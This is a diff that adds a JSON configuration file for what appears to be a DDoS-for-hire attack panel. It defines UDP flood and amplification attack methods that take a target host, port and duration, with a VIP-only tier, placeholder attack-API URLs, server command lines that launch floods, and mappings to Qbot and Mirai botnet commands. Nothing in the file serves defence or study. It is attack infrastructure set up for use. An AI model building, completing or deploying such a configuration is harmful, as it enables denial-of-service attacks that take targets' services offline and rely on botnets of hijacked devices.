@@ -1,0 +1,56 @@
+[
+	{
+		"name":"udpv2",
+		"time":1200,
+		"description":"Udp Flood",
+		"group":"UDP-HARD",
+		"default port":80,
+		"default time":1200,
+		"permission":[],
+		"api":[
+      		"PLACEAPIHERE=<<$host>>&port=<<$port>>&time=<<$time>>&method=gudp"
+		],
+		"server":[
+			{
+				"name":"omega",
+				"command":"./udp <<$host>> <<$port>> <<$time>>"
+			},
+			{
+				"name":"alpha",
+				"command":"wall <<$host>> <<$port>> <<$time>>"
+			}
+		],
+		"botnet":{
+			"qbot":"udp",
+			"mirai":"udp"
+		}
+	},
+	{
+		"name":"home",
+		"time":1200,
+		"description":"Homeholder",
+		"permission":[],
+		"api":[
+			"PLACEAPIHERE<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+			"PLACEAPIHERE<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP"
+		]      
+	},
+	{
+		"name":"nukekill",
+		"time":1200,
+		"description":"nukekill new method",
+		"permission":[],
+		"api":[
+      		"PLACEAPIHERE<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP"       
+		]      
+	},
+ 	{
+		"name":"udp",
+		"time":1200,
+		"description":"udp amplification Flood",
+		"permission":["vip"],
+		"api":[
+			"PLACEAPIHERE<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP"                                       
+		]      
+	}
+]
